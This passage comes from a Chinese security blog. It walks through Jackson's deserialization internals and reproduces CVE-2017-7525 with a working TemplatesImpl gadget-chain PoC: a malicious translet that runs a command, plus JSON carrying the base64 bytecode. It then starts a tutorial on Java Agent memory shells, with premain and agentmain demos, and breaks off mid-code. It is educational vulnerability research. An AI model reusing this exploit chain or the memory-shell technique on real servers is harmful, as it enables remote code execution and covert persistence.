<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832859477-554134c4-8839-4649-b910-b0bff575df0b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832859477-554134c4-8839-4649-b910-b0bff575df0b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着我们回到<code>vanillaDeserialize</code>方法，这里会遍历我们Tearch类的属性值，从根据Json字符串解析的<code>key:Value</code>键值对中找到对应的值，调用<code>deserializeAndSet</code>方法，该方法用来调用对应属性的setter方法进行赋值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832994729-6f35c034-d10b-4761-afaf-79a050543353.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832994729-6f35c034-d10b-4761-afaf-79a050543353.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>deserializeAndSet</code>，继续跟进<code>deserialize</code>方法，这里判断该节点的数据类型是否为NULL，如果不为NULL，则继续判断<code>_valueTypeDeserializer</code>是否为NULL，如果不是NULL则继续调用<code>this._valueDeserializer.deserialize</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755833638987-5088013f-5fa7-423d-b1e9-ef12c72fafb9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755833638987-5088013f-5fa7-423d-b1e9-ef12c72fafb9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>VALUE_NUMBER_INT</code>为NULL的情况下调用<code>getIntValue</code>方法，否则调用<code>_parseInteger</code>，调用完成之后，会返回JSON键值对中的值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834540205-51b25ada-2dce-4ce4-9561-372b99d7e0df.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834540205-51b25ada-2dce-4ce4-9561-372b99d7e0df.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834612438-36b32453-13d0-4d46-8ba0-ecc8e394cbe9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834612438-36b32453-13d0-4d46-8ba0-ecc8e394cbe9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>回到<code>deserializeAndSet</code>方法，接下来调用<code>this._field.set</code>，该方法就用来调用对应属性的setter方法了（在该属性有setter方法的前提下）</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834842695-f325185f-7b58-47e7-b603-34c3e34bec6c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834842695-f325185f-7b58-47e7-b603-34c3e34bec6c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>对于name属性的设置，也是一样的。不一样的是，在我们对sex属性设置时，调用<code>deserialize</code>方法，我们会走到<code>deserializeWithType</code>方法处</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834980881-52d65ab3-0084-4bc0-ad42-a8c543282fac.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755834980881-52d65ab3-0084-4bc0-ad42-a8c543282fac.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>deserializeWithType</code>方法，因为sex的value值是一个数组，这里返回的result为null，因此后面我们会走到<code>deserializeTypedFromObject</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835099060-a41e92b4-dd1b-4916-9f69-31260129f8da.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835099060-a41e92b4-dd1b-4916-9f69-31260129f8da.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>deserializeTypedFromObject</code>，同样因为是数组，我们会走到else if中，这里调用了<code>_deserializeTypedUsingDefaultImpl</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835368443-5f498443-952a-4ae1-ab30-de5ca4f322f5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835368443-5f498443-952a-4ae1-ab30-de5ca4f322f5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先调用<code>_findDefaultImplDeserializer</code>方法，还是因为数组原因，并不会匹配任意一项，最后会调用<code>deserializeTypedFromAny</code>方法从已有类里去找</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835466391-61d05c78-7d43-42dc-9d7d-0c910dea4afd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835466391-61d05c78-7d43-42dc-9d7d-0c910dea4afd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>deserializeTypedFromAny</code>，继续跟进<code>_deserialize</code>方法，该方法中调用<code>this._findDeserializer(ctxt, typeId);</code>找到了我们的<code>com.Jackson.MySex</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835652906-99778d2c-01da-4fe7-8f99-b2c0aaae9ddf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835652906-99778d2c-01da-4fe7-8f99-b2c0aaae9ddf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835799536-7be85835-7f92-4104-900d-5bb494f0bf5c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835799536-7be85835-7f92-4104-900d-5bb494f0bf5c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着就会调用<code>deserialize</code>方法，后续的流程就和之前所说一样了，有点那种递归的意思</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835937801-614106f0-5d96-4d19-8138-2e98d8c2bbfa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755835937801-614106f0-5d96-4d19-8138-2e98d8c2bbfa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="rhUxD">小结</h4>

<p>至此整个调用流程就结束了，同理使用DefaultTyping也是一样的。</p>
<p>简单来说，就是先调用构造函数，生成一个对应类的实例，然后根据JSON的内容，调用对应属性的SETTER方法进行赋值操作，和之前的fastjson反序化是挺像的，但是调用对应setter方法的限制应该是没有fastjson多</p>
<h2 id="Ux21U">Jackson反序列化漏洞</h2>

<p>这里就不写Jackson反序列化漏洞的demo了，原理和fastjson等都是差不多的</p>
<h3 id="cuxx9">前提条件</h3>

<p>只要满足以下条件之一，就存在Jackson反序列化漏洞：</p>
<ul>
<li>调用<code>ObjectMapper.enableDefaultTying</code>函数</li>
<li>对要进行反序列化类的属性配置了注解值为<code>JsonTypeInfo.Id.CLASS</code>的<code>@JsonTypeInfo</code>注解</li>
<li>对要进行反序列化类的属性配置了注解值为<code>JsonTypeInfo.Id.MINIMAL_CLASS</code>的<code>@JsonTypeInfo</code>注解</li>
</ul>
<h3 id="eB04y">Jackson反序列化CVE-2017-7525</h3>
该反序列化链是基于 TemplatesImpl 的利用链

<h4 id="OrPOt">影响版本</h4>
该漏洞的影响版本如下：

<ul>
<li>Jackson &lt; 2.6.7.1</li>
<li>Jackson &lt; 2.7.9.1</li>
<li>Jackson &lt; 2.8.8.1</li>
</ul>
<h4 id="CHQ0H">限制条件</h4>
由于该链是基于 TemplatesImpl 的利用链，所以JDK版本为7u21或8u20，使用动态代理的链子

<h4 id="X88el">漏洞</h4>
<h5 id="VXnfF">漏洞复现</h5>

<p>新建一个Test对象，如果不使用<code>enableDefaultTyping</code>方法，则需要配置<code>@JasonTypeInfo</code>注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建我们的恶意类，编译为class文件（本身想用javassit生成，但是感觉没有这个方便）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calcTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">calcTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;G:\\tmp\\calcTest.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;object\&quot;:&quot;</span> +</span><br><span class="line">                <span class="string">&quot;[\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;transletBytecodes\&quot;:[\&quot;&quot;</span> + exp + <span class="string">&quot;\&quot;],\&quot;transletName\&quot;:\&quot;CulrySean\&quot;,\&quot;outputProperties\&quot;:&#123;&#125;&#125;]&#125;&quot;</span>;</span><br><span class="line">        System.out.printf(json);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(cls);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> DatatypeConverter.printBase64Binary(bytes);</span><br><span class="line">        <span class="keyword">return</span> base64Encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755842387837-454788fc-7809-4e97-8459-11ea91abcc5b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755842387837-454788fc-7809-4e97-8459-11ea91abcc5b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>看完Poc后，根据前面分析的会调用对应属性的setter方法进行赋值，但是这条链子明显和<code>getgetOutputProperties</code>方法有关，问了一下AI，说：在反序列化的特殊情况下，只有getter方法没有setter方法，会调用getter方法，可以仔细再去分析一下源码</p>
<h5 id="yfSKH">分析调试</h5>

<p>我们在这里的漏洞分析调试，是对于<code>getgetOutputProperties</code>方法也就是getter方法触发的分析，对于TemplatesImpl 利用链，可以自行找文章分析或看我之前的文章</p>
<p>前面的部分我们不再调试，我们走到<code>vanilaDeserialize</code>方法处，一直步进到处理<code>outputProperties</code>方法处，在该方法中调用了<code>this._beanProperties.find</code>方法，我们看到<code>_beanProperties</code>的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties=[uriresolver([simple type, <span class="keyword">class</span> <span class="title class_">javax</span>.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, <span class="keyword">class</span> <span class="title class_">byte</span>]]]), stylesheetDOM([simple type, <span class="keyword">class</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.DOM]), transletName([simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]), outputProperties([map type; <span class="keyword">class</span> <span class="title class_">java</span>.util.Properties, [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String] -&gt; [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]])]</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846254833-83663769-9ace-49d8-8416-a8da6591942c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846254833-83663769-9ace-49d8-8416-a8da6591942c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><code>this._beanProperties.find</code>返回一个<code>SetterLessProperty</code>对象，从名字上看，就知道是在该属性值没有setter方法的情况下返回的对象，并且我们能在里面看到getter方法也就是<code>getgetOutputProperties</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846565393-9e900805-52ab-4b8e-9f9f-48a7e711d03a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846565393-9e900805-52ab-4b8e-9f9f-48a7e711d03a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续向下调用<code>prop.deserializeAndSet</code>，也就是<code>SetterlessProperty.deserializeAndSet</code>，跟进看一看，就可以发现，这里不再调用setter方法而是getter方法，因此可以触发我们的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846764423-817075c1-3622-457b-9efa-52b36416fb06.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846764423-817075c1-3622-457b-9efa-52b36416fb06.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后走到<code>getgetOutputProperties</code>方法触发漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846888925-9d88fb5c-c089-4cbd-8fcc-05d98eb40ac6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755846888925-9d88fb5c-c089-4cbd-8fcc-05d98eb40ac6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="bmmKZ">高版本JDK限制</h4>

<p>在一些大版本下，JDK1.7、JDK1.8中的TemplatesImpl类是有所区别的</p>
<p>大版本下，无法触发payload的原因在于，新建TransletClassLoader类的代码中，调用了<code>_factory</code>属性，但是该属性为null，因此会抛出异常</p>
<p>同时在Jackson中也无法设置<code>_tfactory</code>，因为该属性没有对应的getter和setter方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847300150-d0a9ba33-b63d-47f6-ab9f-e9c7a243d518.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847300150-d0a9ba33-b63d-47f6-ab9f-e9c7a243d518.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="M6VmS">补丁修复</h4>

<p>在调用 <code>BeanDeserializerFactory.createBeanDeserializer</code> 函数创建 Bean 反序列化器的时候，其中会调用 <code>checkIllegalTypes</code> 函数提取当前类名，然后使用黑名单进行过滤：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847421582-c3f956f2-4732-4ff0-92cb-f6b97a39aca0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755847421582-c3f956f2-4732-4ff0-92cb-f6b97a39aca0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Jackson</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent内存马</title>
    <url>/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="zvv0j">JavaAgent内存马</h1>
<h2 id="wYDuQ">前言</h2>
基于Tomcat的内存马类型有四种：Filter、Servlet、Listener和Agent。

<p>在之前的面试中，有个问题是：如果不是基于Tomcat的Java网站，该如何注入内存马。当时没有了解到Agent内存马，现在才知道， Agent内存马是不受Tomcat框架限制的，因此来学习研究一下</p>
<h2 id="wd5kF">JavaAgent简介</h2>
学了这么长时间Java，我们知道Java与PHP不同，它是一种静态强类型语言，在运行之前必须将其编译成.class字节码，然后再交给JVM处理运行。

<p>在JDK1.5之后，引入了<code>java.lang.instrument</code>包，该包提供了检测java程序的API接口，其中包括 监控、收集性能信息和诊断问题等，通过<code>java.lang.insrument</code>实现的工具我们称它为Java Agent。JavaAgent能够在不影响正常编译的情况下来修改字节码（动态修改已加载和未加载的类，其中包括属性和方法），类似于之前学习的反射修改属性值的方式。</p>
<p>Java Agent支持以下两种方式进行加载：</p>
<ul>
<li>实现premain方法，在启动时进行加载（JDK &gt;&#x3D; 1.5）</li>
<li>实现agentmain方法，在启动后进行加载（JDK &gt;&#x3D; 1.6）</li>
</ul>
<blockquote>
<p>普通Java类以main函数作为入口点，而JavaAgent的入口点是premain和agentmain</p>
</blockquote>
<h2 id="cL2nD">JaveAgent加载</h2>
<h3 id="vB7lQ">Agent-premain</h3>
PreMain的大体流程如下，Agent的premain方法会在main函数执行前执行

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751445957711-bb05d317-4e26-4f5c-872b-3d9256184277.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751445957711-bb05d317-4e26-4f5c-872b-3d9256184277.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>想要实现启动时执行premain方法，首先我们必须去实现premain方法，同时在我们的清单（sMainfest）中必须要包含<code>Premain-Class</code>属性，然后再命令行中利用<code>-javaagent</code>参数实现启动时加载</p>
<p>我们来实现一个Demo来进行测试</p>
<p>首先创建一个类当作我们的Agent类，实现premain方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">preAgent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain method is invoked!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后创建mainfest，将其保存到<code>agent.mf</code>文件内，且需要含有Premain-Class属性</p>
<p>PS！！！：在.mf文件的最后，一定要有空行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: preAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用Javac命令将java文件编译成class文件，然后利用jar命令进行打包，去生成我们的agent.jar</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac preAgent.java</span><br><span class="line">jar cvfm agent.jar agent.mf preAgent.class</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751446972404-def1a412-f34c-4d36-a688-ace359640383.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751446972404-def1a412-f34c-4d36-a688-ace359640383.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后再去创建一个普通类去实现main方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello,PreAgent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将以下内容写入Demo.mf</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Main-Class: com.Demo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用同样的方法进行编译打包成Demo.jar</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac Demo.java</span><br><span class="line">jar cvfm agent.jar Demo.mf Demo.class</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751447199435-8ee58d8e-a609-4dd3-99f6-f8643efb4298.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751447199435-8ee58d8e-a609-4dd3-99f6-f8643efb4298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最终我们得到了agent.jar和Demo.jar</p>
<p>然后我们在<code>java -jar</code>中添加参数<code>-javaagent:agent.jar</code>，就可以在启动时优先执行preAgent中的premain方法，并且可以通过命令行传入我们的agetnArgs参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar=Sean -jar Demo.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751448443500-a2f61b75-e9a0-4efa-806c-242c620bed36.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1751448443500-a2f61b75-e9a0-4efa-806c-242c620bed36.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="yAHsz">Agent-agentmain</h3>
上述的premain方法在JDK1.5中提供，在JDK版本为1.5时，开发者只能在main加载之前添加手脚，但是对于大部分内存马注入时，都是JVM已经运行的情况下。在JDK1.6中实现了attach-on-demand，我们可以使用AttachAPI动态的加载Agent，agentmain能够在JVM启动后加载并实现相应的修改字节码的功能。

<p>AttachAPI在tool.jar中，而JVM启动时默认不加载该依赖，需要我们在classpath中额外进行指定</p>
<h4 id="KACw7">VirtualMachine类</h4>
VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"><span class="comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"><span class="comment">//获得当前所有的JVM列表</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"><span class="comment">//解除与特定JVM的连接</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure>

<h4 id="kyyOt">VirtualMachineDescriptor</h4>
com.sun.tools.attach.VirtualMachineDescriptor类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例。

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;  </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.sean.get_PID&quot;</span>))  </span><br><span class="line">                System.out.println(vmd.id());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dfLoX">Demo实现</h4>
接下来我们简单实现一下agentMain

<p>首先编写一个 <code>Sleep_Hello</code>类，模拟正在运行的 JVM</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编写<font style="color:#080808;background-color:#ffffff;">AgentMain类作为我们的Agent</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    